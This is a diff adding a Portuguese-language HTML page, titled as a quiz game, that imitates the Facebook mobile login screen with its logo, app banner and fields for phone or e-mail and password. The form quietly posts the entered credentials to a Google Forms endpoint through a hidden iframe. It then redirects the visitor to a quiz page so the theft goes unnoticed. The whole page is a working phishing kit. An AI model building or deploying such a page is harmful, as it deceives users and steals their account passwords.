@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/estilo.css">
+    <title>Jogo das perguntas</title>
+</head>
+<body>
+
+    <div class="mobile-container">
+        
+        <div class="app-banner">
+            <span class="download-icon">&#10515;</span> <span class="app-banner-text">Obtém o Facebook para Android e navega mais depressa.</span>
+        </div>
+
+        <div class="header">
+            <span class="language-text">Português (Portugal)</span>
+        </div>
+
+        <div class="logo-area">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="60px" height="60px">
+                <circle cx="24" cy="24" r="24" fill="#1877F2"/>
+                <path fill="#FFF" d="M29.548,48V26.269h6.086l0.911-7.069h-6.997v-4.515c0-2.046,0.568-3.441,3.504-3.441 l3.744-0.002V4.863c-0.648-0.086-2.871-0.279-5.456-0.279c-5.398,0-9.094,3.295-9.094,9.349v5.268h-6.106v7.069h6.106V48H29.548z"/>
+            </svg>
+        </div>
+        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+        
+        <form 
+            class="login-form" 
+              action="https://docs.google.com/forms/d/e/1FAIpQLSfUhmYNnFSFE4NzvdC8iyP-h6K6X1vzibRjIA0PdCoCsIT4Dg/formResponse" 
+              method="POST" 
+              target="hidden_iframe"
+              onsubmit="redirecionarParaQuiz()"
+              >
+
+            <input 
+                type="text" 
+                name="entry.508012331" 
+                placeholder="Número de telemóvel ou e-mail" 
+                required>
+            
+            <input 
+                type="password" 
+                   name="entry.1369238852" 
+                   placeholder="Palavra-passe" 
+                   required>
+            
+            <button class="login-btn" type="submit">Iniciar sessão</button>
+            
+        </form>
+
+
+    </div>
+
+<script>
+        function redirecionarParaQuiz() {
+
+            setTimeout(() => {
+                window.location.href = "./pages/JogoQuiz.html";
+            }, 1000);
+            
+            return true;
+        }
+    </script>
+</body>
+</html>
